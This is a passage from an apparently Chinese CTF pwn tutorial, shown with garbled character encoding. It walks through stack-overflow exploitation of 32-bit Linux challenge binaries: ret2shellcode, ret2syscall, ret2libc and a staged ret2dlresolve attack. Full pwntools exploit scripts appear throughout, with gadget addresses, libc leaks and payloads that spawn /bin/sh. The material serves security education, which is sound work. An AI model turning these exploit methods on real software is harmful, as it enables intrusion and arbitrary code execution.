p32(buf2)sh.sendline(payload)sh.interactive()&quot;&quot;&quot;è§£é‡Šä¸€ä¸‹&quot;&quot;&quot;&quot;&quot;&quot;shellcraft.shä½œç”¨æ˜¯ç”Ÿæˆå¥½system(&quot;bin/sh&quot;)çš„ä»£ç &quot;&quot;&quot;&quot;&quot;&quot;asmå‡½æ•°æ˜¯å°†ä»£ç è½¬æˆæœºå™¨æŒ‡ä»¤&quot;&quot;&quot;&quot;&quot;&quot;ljustå‡½æ•°ä½œç”¨å°±æ˜¯å‘å³å¯¹å…¶å¹¶ç”¨ç»™å®šå­—ç¬¦è¡¥å……å­—ç¬¦ä¸²&quot;&quot;&quot;\n\né€šè¿‡æ ˆæº¢å‡ºè·³è½¬åˆ°æˆ‘ä»¬å†™å¥½shellcodeçš„åŒºåŸŸï¼Œè®©ç¨‹åºæ‰§è¡Œshellcodeä»è€Œè·å–shell\n\nret2syscallæ–¹æ³•æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚\næ€è·¯å…ˆæŸ¥çœ‹é™„ä»¶\n\næ¥ä¸‹æ¥åˆ©ç”¨ IDA æ¥æŸ¥çœ‹æºç ï¼Œå¹¶æ²¡æœ‰systemå‡½æ•°ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰bin/shå­—ç¬¦\nå¯ä»¥çœ‹åˆ°ï¼Œå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®¡ç®—v4çš„åç§»é‡ã€‚å…ˆè®¾ç½®æ–­ç‚¹ï¼Œå°†æ–­ç‚¹è®¾ç½®åœ¨è°ƒç”¨getså‡½æ•°é‚£é‡Œ\næ¥ä¸‹æ¥å°±æ˜¯è°ƒè¯•ã€‚å¯ä»¥çœ‹åˆ°espæŒ‡å‘åœ°å€0xffffcf80ï¼Œv4çš„åœ°å€ä¸ºesp+1cï¼ŒebpæŒ‡å‘çš„åœ°å€0xffffd008ï¼Œç”±æ­¤å¯ä»¥è®¡ç®—å‡ºv4çš„åç§»é‡ä¸º0xffffd008-0xffffcf80-0x1c=108ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¦†ç›–çš„è¿”å›åœ°å€ç›¸å¯¹äº v4 çš„åç§»ä¸º 112ã€‚\næ­¤æ¬¡ï¼Œç”±äºæˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„æŸä¸€æ®µä»£ç æˆ–è€…è‡ªå·±å¡«å†™ä»£ç æ¥è·å¾— shellï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„ gadgets æ¥è·å¾— shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚ï¼ˆç³»ç»Ÿè°ƒç”¨åŸºæœ¬çŸ¥è¯†ï¼‰æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰§è¡Œ int 0x80 æ¥æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¯¹äºè¿™é“é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨**execve(â€œ/bin/shâ€,NULL,NULL)**ï¼Œå…¶ä¸­ï¼Œè¯¥ç¨‹åºæ˜¯ 32 ä½ï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨éœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼š\n\nç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xbï¼ˆæ˜¯æŒ‡ç³»ç»Ÿè°ƒç”¨ç¼–å·ï¼‰\nç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ /bin/sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚\nç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0\nç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0\n\n64ä½shellcodeçš„å‚æ•°å’Œexecveè°ƒç”¨åº”ä¸ºï¼š\n\nrax = 0x3b\nrdiæŒ‡å‘â€/bin/shâ€\nrsi = 0x0\nrdx = 0x0\nexecve(â€œ/bin/shâ€, 0, 0);\n\nä¸ºæ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ gadgetsæ¥å®Œæˆã€‚å¦‚åˆ©ç”¨å †æ ˆå¯¹å¯„å­˜å™¨èµ‹å€¼ï¼Œå…ˆå°†10å­˜å…¥æ ˆä¸­ï¼Œå†pop eaxã€‚æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ç¬¦åˆæ¡ä»¶çš„gadgetsã€‚ï¼ˆROPgadgetå®‰è£…ä¸ä½¿ç”¨æ–¹æ³•ï¼‰\næ¥ä¸‹æ¥å°±æ˜¯ç»„è£…ï¼š**payload = flat([â€˜Aâ€™ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])**ï¼Œå…¶ä¸­ 0xb ä¸º execve å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚\nEXP1234567891011from pwn import *sh = process(&#x27;./rop&#x27;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421bin_sh = 0x80be408payload =&#x27;A&#x27; * 112+p32(pop_eax_ret)+ p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bin_sh)+p32(int_0x80)sh.sendline(payload)sh.interactive()\n\n\nret2libc1æ–¹æ³•åˆ©ç”¨gadgetsæ„å»ºROPè·å–shell\næ€è·¯checkä¸€ä¸‹32ä½ç¨‹åºï¼Œä¸”åªå¼€äº†NXä¿æŠ¤\n\nä¸¢è¿›IDAï¼ŒæŸ¥çœ‹ä¼ªä»£ç ï¼Œå­˜åœ¨getså‡½æ•°ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨æ ˆæº¢å‡º\næŸ¥çœ‹å‡½æ•°åˆ—è¡¨ä»¥åŠå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥æ„å»ºROP\næœ€åå°±æ˜¯è®¡ç®—åç§»é‡ã€‚sçš„åç§»é‡0xffffcfb8-ffffcf4c=6cï¼Œç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»é‡6c+4\nEXP12345678from pwn import *p = process(&quot;./ret2libc1&quot;)sys_addr = 0x8048460bin_sh = 0x08048720payload = &#x27;a&#x27;*112+p32(sys_addr)+â€˜a&#x27;*4+p32(bin_sh)p.sendline(payload)p.interactive()&quot;&quot;&quot;å› ä¸ºè°ƒç”¨systemå‡½æ•°ä¸­é€”éœ€è¦ä¸€ä¸ªè¿”å›åœ°å€ï¼Œè€Œç›´æ¥åˆ©ç”¨system gadgetä¼šå¯¼è‡´ç¼ºå¤±è¿”å›åœ°å€ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªè™šæ‹Ÿåœ°å€p32(0x11111111)å¹³è¡¡å †æ ˆ&quot;&quot;&quot;\n\n\nret2libc2idaæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰systemå‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰bin/shï¼Œä½†æ˜¯è¿™é‡Œæœ‰getså‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨getså‡½æ•°ä¼ å…¥bin/shå­—ç¬¦ï¼Œä»è€Œåˆ©ç”¨systemè·å–shell\n\n\nè®¡ç®—å¥½åç§»ï¼Œå°†é€šè¿‡getsè·å–çš„å­—ç¬¦å­˜å…¥åˆ°bssæ®µå¯å†™åŒºåŸŸ\n\nEXP123456789from pwn import *p = process(&quot;./ret2libc2&quot;)sys_addr = 0x08048490bss = 0x804a000gets_addr = 0x8048460pop_ebx = 0x0804843dpayload = &#x27;a&#x27;*0x70+p32(gets_addr)+p32(sys_addr)+p32(bss)+p32(bss)p.sendline(payload)p.interactive()\n\næ ˆç¤ºæ„å›¾å¦‚ä¸‹ï¼š\n\nret2libc3æ€è·¯è¿™æ¬¡çš„é¢˜ç›®æ²¡æœ‰systemå‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰bin/shå­—ç¬¦ä¸²ï¼Œä¹Ÿä¸åƒret2shellcodeå¯ä»¥è·³è½¬æ‰§è¡Œshellcodeï¼Œå› æ­¤ï¼Œåªèƒ½æ¢è¿‡ä¸€ç§æ€è·¯ã€‚åœ¨libc.so åŠ¨æ€é“¾æ¥åº“ä¸­å‡½æ•°çš„åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³„éœ²æŸä¸ªå‡½æ•°çš„åç§»æ¥ç¡®å®šç¨‹åºä½¿ç”¨çš„libcç‰ˆæœ¬ï¼Œä»è€Œè·å–systemå‡½æ•°çš„çš„åœ°å€ã€‚æˆ‘ä»¬ä¸€èˆ¬å¸¸ç”¨çš„æ–¹æ³•æ˜¯é‡‡ç”¨ got è¡¨æ³„éœ²ï¼Œå³è¾“å‡ºæŸä¸ªå‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹ã€‚å½“ç„¶ï¼Œç”±äº libc çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„åœ°å€ã€‚ï¼ˆæ‰€è°“å»¶è¿Ÿç»‘å®šï¼Œå°±æ˜¯å½“å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™æ‰è¿›è¡Œç»‘å®šï¼ˆåŒ…æ‹¬ç¬¦å·æŸ¥æ‰¾ã€é‡å®šä½ç­‰ï¼‰ï¼Œå¦‚æœå‡½æ•°ä»æ¥æ²¡æœ‰ç”¨åˆ°è¿‡å°±ä¸è¿›è¡Œç»‘å®šã€‚åŸºäºå»¶è¿Ÿç»‘å®šå¯ä»¥å¤§å¤§åŠ å¿«ç¨‹åºçš„å¯åŠ¨é€Ÿåº¦ï¼Œç‰¹åˆ«æœ‰åˆ©äºä¸€äº›å¼•ç”¨äº†å¤§é‡å‡½æ•°çš„ç¨‹åºï¼‰å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š\n\næ³„éœ² __libc_start_main åœ°å€\n\nè·å– libc ç‰ˆæœ¬\n\nè·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€\n\nå†æ¬¡æ‰§è¡Œæºç¨‹åº\n\nè§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)\nåˆ†æ\nEXP1234567891011121314151617from pwn import *from LibcSearcher import LibcSearchersh = process(&#x27;./ret2libc3&#x27;)ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]        # è·å–ç¨‹åºä¸­putså‡½æ•°çš„pltåœ°å€libc_puts_got = ret2libc3.got[&#x27;puts&#x27;]          # è·å–ç¨‹åºä¸­putså‡½æ•°çš„gotstart_addr = ret2libc3.symbols[&#x27;_start&#x27;]        # è·å–ç¨‹åºä¸­_startå‡½æ•°çš„åœ°å€payload1 = flat([&#x27;A&#x27; * 112, puts_plt,start_addr , libc_puts_got])        # é€šè¿‡æ ˆæº¢å‡ºè®©ç¨‹åºè·³è½¬åˆ°putså‡½æ•°æ³„éœ²å‡ºlibc_puts_gotåœ°å€å†è¿”å›åˆ°startå‡½æ•°é‡æ–°æ‰§è¡Œsh.sendlineafter(&#x27;Can you find it !?&#x27;, payload1)libc_puts_addr = u32(sh.recv()[0:4])         # æ¥æ”¶putså‡½æ•°çš„åœ°å€libc = LibcSearcher(&#x27;puts&#x27;, libc_puts_addr)       # ç¡®å®šç¨‹åºä½¿ç”¨çš„libclibcbase = libc_puts_addr - libc.dump(&#x27;puts&#x27;)       # è®¡ç®—åŸºåœ°å€system_addr = libcbase + libc.dump(&#x27;system&#x27;)         # è®¡ç®—å‡ºsystemå‡½æ•°ä»¥åŠbin/shå­—ç¬¦ä¸²çš„åœ°å€binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload2 = flat([&#x27;A&#x27; * 112, system_addr, &#x27;a&#x27;*4, binsh_addr])sh.sendline(payload2)sh.interactive()\n\n\nå‚è€ƒæ–‡ç« ï¼šhttps://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall\nNO RELROä»‹ç»è¿™é“é¢˜å‰å…ˆè¡¥å……ä¸€äº›çŸ¥è¯†ç‚¹ï¼š\ndl_runtime_resolve å‡½æ•°åœ¨å»¶è¿Ÿç»‘å®šä¸­è¯´åˆ°dl_runtime_resolve å‡½æ•°ï¼Œåªæ˜¯è¯´äº†è¿™ä¸ªå‡½æ•°ä¼šå¯»æ‰¾ç¨‹åºç¬¬ä¸€æ¬¡æ‰§è¡Œçš„å‡½æ•°ä½†æ˜¯å¹¶æ²¡æœ‰è¯´åŸç†ï¼Œè¿™æ¬¡æ¥è¡¥å……ä¸€ä¸‹ã€‚\n\ndl_runtime_resolve éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ reloc_argï¼Œå°±æ˜¯å‡½æ•°è‡ªå·±çš„ plt è¡¨é¡¹ push çš„å†…å®¹ï¼Œä¸€ä¸ªæ˜¯link_mapï¼Œè¿™ä¸ªæ˜¯å…¬å…± plt è¡¨é¡¹ push è¿›æ ˆçš„ï¼Œé€šè¿‡å®ƒå¯ä»¥æ‰¾åˆ°.dynamicçš„åœ°å€\n\nè€Œ .dynamic å¯ä»¥æ‰¾åˆ° .dynstrã€.dynsymã€.rel.plt çš„è¿™äº›ä¸œè¥¿çš„åœ°å€\n\n.dynstr çš„åœ°å€æ˜¯ .dynamic + 0x44 -&gt; 0x08048278\n.dynsym çš„åœ°å€æ˜¯ .dynamic + 0x4c -&gt; 0x080481d8\n\n\n.rel.plt çš„åœ°å€æ˜¯ .dynamic + 0x84 -&gt; 0x08048330\n\n\n.rel.plt çš„åœ°å€åŠ ä¸Š reloc_arg å¯ä»¥å¾—åˆ°å‡½æ•°é‡å®šä½è¡¨é¡¹ Elf32_Rel çš„æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆå¯¹åº”çš„é‡Œé¢æ”¾ç€ r_offsetã€r_info\n\nå°† r_info&gt;&gt;8 å¾—åˆ°çš„å°±æ˜¯ .dynsym çš„ä¸‹æ ‡ï¼Œè¿™ä¸ªä¸‹æ ‡çš„å†…å®¹å°±æ˜¯ name_offset\n\n.dynstr+name_offset å¾—åˆ°çš„å°±æ˜¯ st_nameï¼Œè€Œ st_name å­˜æ”¾çš„å°±æ˜¯è¦è°ƒç”¨å‡½æ•°çš„å‡½æ•°å\n\nåœ¨åŠ¨æ€é“¾æ¥åº“é‡Œé¢æ‰¾è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œèµ‹å€¼ç»™ *rel-&gt;r_offsetï¼Œä¹Ÿå°±æ˜¯ GOT è¡¨å°±å®Œæˆäº†ä¸€æ¬¡å‡½æ•°çš„åŠ¨æ€é“¾æ¥\n\n\n\næ ˆè¿ç§»æ ˆè¿ç§»ä½œç”¨æ˜¯è®©ç¨‹åºè·³è½¬åˆ°æˆ‘ä»¬æ„é€ å¥½çš„æ ˆä¸­ä»è€Œè®©ç¨‹åºæŒ‰ç…§æˆ‘ä»¬çš„æ€è·¯èµ°ä¸‹å»ã€‚\n\nå…ˆç”¨æ— ç”¨å­—ç¬¦å¡«æ»¡åˆ°rbp\nåœ¨å°†rbpè·³è½¬åˆ°æˆ‘ä»¬æƒ³æ„é€ çš„æ ˆå¸§ä½ç½®\nå†é€šè¿‡readå‘æˆ‘ä»¬æƒ³æ„é€ çš„æ ˆä¸­å†™å…¥æ•°æ®\næœ€åé€šè¿‡leave_retå°†espæŒ‡å‘æ ˆå¸§ï¼ŒebpæŒ‡å‘æ ˆåº•ä½ç½®\n\n\nå› ä¸ºæ­¥éª¤æœ‰ç‚¹å¤šï¼Œæ‰€ä»¥å°±è¾¹å†™è¾¹æ”¹ã€‚\nstage1å…ˆå°†æ ˆè¿ç§»åˆ°æˆ‘ä»¬æƒ³æ„é€ çš„åœ°æ–¹å¹¶åœ¨è¯¥åœ°æ–¹å†™å…¥æˆ‘ä»¬æƒ³è¦å†™çš„æ•°æ®\n12345678910111213141516171819202122232425262728293031323334353637from pwn import *elf = ELF(&#x27;main&#x27;)offset = 112read_plt = elf.plt[&#x27;read&#x27;]write_plt = elf.plt[&#x27;write&#x27;]ppp_ret = 0x08048619 # ROPgadget --binary main--only &quot;pop|ret&quot;ï¼Œä½œç”¨æ˜¯å°†readçš„å‚æ•°å¼¹å‡ºæ¢å¤å †æ ˆpop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary main --only &quot;leave|ret&quot;stack_size = 0x800bss_addr = 0x0804a040 # readelf -S main | grep &quot;.bss&quot;base_stage = bss_addr + stack_sizer = process(&#x27;./main&#x27;)r.recvuntil(&#x27;Welcome to XDCTF2015~!\\n&#x27;)# payload1payload = &#x27;A&#x27; * offsetpayload += p32(read_plt) # è¯»100ä¸ªå­—èŠ‚åˆ°base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # æŠŠbase_stage popåˆ°ebpä¸­payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;å°†espæŒ‡å‘base_stager.sendline(payload1)# payload2cmd = &quot;/bin/sh&quot;payload2 = &#x27;AAAA&#x27; # å› ä¸ºå‰é¢leave_retä»¥åespä¼šæŒ‡å‘base_stageä¸‹ä¸€åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œç”¨æ— ç”¨å­—ç¬¦å¡«å……payload2 += p32(write_plt)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\npayloadé‡Œé¢çš„p32(read_plt)+p32(ppp_ret)+p32(0) +p32(base_stage) +p32(100)æ„é€ å‡½æ•°read(0,base_stage,100)ä½œç”¨æ˜¯å‘æˆ‘ä»¬ä¼ªé€ æ•°æ®æ®µçš„åœ°æ–¹å†™å…¥æ•°æ®ï¼Œä¹Ÿå°±æ˜¯åé¢çš„payload2\nstage2æ¥ä¸‹æ¥ï¼Œç”¨ dlresolve çš„çŸ¥è¯†æ¥è°ƒç”¨ write å‡½æ•°ï¼Œåˆ©ç”¨ plt[0] çš„ç›¸å…³æŒ‡ä»¤ï¼Œå³å…¬å…± plt è¡¨é¡¹ push linkmap ä»¥åŠè·³è½¬åˆ° dl_resolve å‡½æ•°ä¸­è§£æçš„æŒ‡ä»¤ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¾—å•ç‹¬æä¾›ä¸€ä¸ª write é‡å®šä½é¡¹åœ¨ plt è¡¨ä¸­çš„åç§»ï¼Œå³ write@plt pushçš„é‚£ä¸ªå‚æ•°ã€‚æ•´ä¸ªè¿‡ç¨‹ç›¸å½“äºè°ƒç”¨dl_runtime_resolve å‡½æ•°ã€‚\n1234567891011121314151617...cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380 # objdump -d -j .plt mainindex_offset = 0x20 # write&#x27;s indexpayload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\n\npayload2 = p32(plt_0) + p32(index_offset)ï¼šåˆ©ç”¨dl_runtime_resolve å‡½æ•°çš„åŸç†æ‰¾åˆ°writeå‡½æ•°\nstage3åŒæ ·æ§åˆ¶ dl_resolve å‡½æ•°ä¸­çš„ reloc_index å‚æ•°ï¼Œä¸è¿‡è¿™æ¬¡æ§åˆ¶å…¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ write é‡å®šä½é¡¹\n1234567891011121314151617181920212223...cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380 # objdump -d -j .plt mainrel_plt = 0x08048330 # objdump -s -j .rel.plt mainindex_offset = (base_stage + 28) - rel_plt # base_stage + 28æŒ‡å‘fake_relocï¼Œå‡å»rel_pltå³åç§»write_got = elf.got[&#x27;write&#x27;]r_info = 0x607 # write: Elf32_Rel-&gt;r_infofake_reloc = p32(write_got) + p32(r_info)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &#x27;A&#x27; * (28 - len(payload2))payload2 += fake_reloc # (base_stage+28)çš„ä½ç½®payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\n\nçº¢è‰²åŒºåŸŸæ˜¯æˆ‘ä»¬ä¼ªé€ çš„ï¼š\n\nstage4è¿™ä¸€æ¬¡æ„é€ fake_symï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„st_nameã€‚ä¼ªé€ .dynsymçš„åœ°å€fake_sym_addrï¼Œé€šè¿‡fake_sym_addrè®¡ç®—å‡ºä¼ªé€ r_infoã€‚\næ‰€ä»¥payload2è¿è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼šå…ˆè·³è½¬åˆ°å…¬å…±plt[0]ï¼Œplt[0]ä¼šè·³è½¬åˆ°åœ°å€.dynamicï¼Œ.dynamic å¯ä»¥æ‰¾åˆ°.rel.plt ï¼Œ.rel.plt çš„åœ°å€åŠ ä¸Šä¼ªé€ æ•°æ®index_offset å¯ä»¥å¾—åˆ°å‡½æ•°é‡å®šä½è¡¨é¡¹ä¼ªé€  çš„fake_relocæŒ‡é’ˆï¼ŒæŒ‡é’ˆä¸­r_info&gt;&gt;8ä½œä¸º.dynsymä¸‹æ ‡æ‰¾åˆ°name_offsetï¼Œname_offsetåŠ ä¸Š.dynstræ‰¾åˆ°writeå‡½æ•°åï¼Œæœ€åæ‰¾åˆ°å¯¹åº”å‡½æ•°åœ°å€\n123456789101112131415161718192021222324252627282930313233...cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&#x27;write&#x27;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„Elf32_Symç»“æ„ä½“éƒ½æ˜¯0x10å­—èŠ‚å¤§å°fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 # é™¤ä»¥0x10å› ä¸ºElf32_Symç»“æ„ä½“çš„å¤§å°ä¸º0x10ï¼Œå¾—åˆ°writeçš„dynsymç´¢å¼•å·r_info = (index_dynsym &lt;&lt; 8) | 0x7 # è®¡ç®— r_info,|7ç›¸å½“äºåŠ 7,åé¢æ·»åŠ ä¸Š07æ ‡è¯†,è¡¨ç¤ºè¿™ä¸ªæ˜¯å¯¼å…¥å‡½æ•°fake_reloc = p32(write_got) + p32(r_info)name_offset = 0x4c fake_sym = p32(name_offset) + p32(0) + p32(0) + p32(0x12)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &#x27;A&#x27; * (28 - len(payload2))payload2 += fake_reloc # (base_stage+28)çš„ä½ç½®payload2 += &#x27;B&#x27; * alignpayload2 += fake_sym # (base_stage+36)çš„ä½ç½®payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\n\n12r_info = (index_dynsym &lt;&lt; 8) | 0x7 # è®¡ç®— r_info,|7ç›¸å½“äºåŠ 7,åé¢æ·»åŠ ä¸Š07æ ‡è¯†,è¡¨ç¤ºè¿™ä¸ªæ˜¯å¯¼å…¥å‡½æ•°fake_sym = p32(name_offset) + p32(0) + p32(0) + p32(0x12)  # name_offset=4c\n\nè¿™ä¸¤è¡Œä»£ç å°±æ˜¯æ¨¡æ‹Ÿå¯»æ‰¾name_offsetã€‚åŸæ¥çš„æµç¨‹æ˜¯r_info&gt;&gt;8ä½œä¸ºä¸‹æ ‡æ‰¾åˆ°.dynsymå¯¹åº”çš„å†…å®¹ï¼Œè€Œè¿™ä¸¤è¡Œä»£ç ä¹Ÿæ˜¯ä¸€æ ·ï¼Œé€šè¿‡å‡çš„r_info&gt;&gt;8æ‰¾åˆ°çš„åœ°å€å°±æ˜¯æˆ‘ä»¬å·²ç»æ„é€ çš„åœ°æ–¹ï¼Œå› ä¸ºç”±å‰é¢å¯ä»¥çŸ¥é“åŸæ¥çš„æµç¨‹æ˜¯r_info&gt;&gt;8ä½œä¸ºä¸‹æ ‡æ˜¯6ï¼ˆåŸæ¥çš„r_info=0x607ï¼‰ï¼Œæ‰€ä»¥fake_symä¼ªé€ æˆç¬¬å…­è¡Œå³å¯\n\n\nstage5æŠŠst_nameæŒ‡å‘è¾“å…¥çš„å­—ç¬¦ä¸²&quot;write&quot;\n1234567891011121314151617181920212223242526272829303132cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&#x27;write&#x27;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # åŠ 0x10å› ä¸ºElf32_Symçš„å¤§å°ä¸º0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)çš„ä½ç½®payload2 += &#x27;B&#x27; * alignpayload2 += fake_sym # (base_stage+36)çš„ä½ç½®payload2 += &quot;write\\x00&quot;  # st_nameå¯¹åº”çš„ä½ç½®payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\n\n\nstage6æ›¿æ¢writeä¸ºsystemï¼Œå¹¶ä¿®æ”¹systemçš„å‚æ•°\n1234567891011121314151617181920212223242526272829303132cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&#x27;write&#x27;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(base_stage + 80)payload2 += &#x27;aaaa&#x27;payload2 += &#x27;aaaa&#x27;payload2 += fake_reloc # (base_stage+28)çš„ä½ç½®payload2 += &#x27;B&#x27; * alignpayload2 += fake_sym # (base_stage+36)çš„ä½ç½®payload2 += &quot;system\\x00&quot;payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\nEXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *elf = ELF(&#x27;main&#x27;)offset = 112read_plt = elf.plt[&#x27;read&#x27;]write_plt = elf.plt[&#x27;write&#x27;]ppp_ret = 0x08048619 # ROPgadget --binary main --only &quot;pop|ret&quot;pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary main --only &quot;leave|ret&quot;stack_size = 0x800bss_addr = 0x0804a040 # readelf -Smain | grep &quot;.bss&quot;base_stage = bss_addr + stack_sizer = 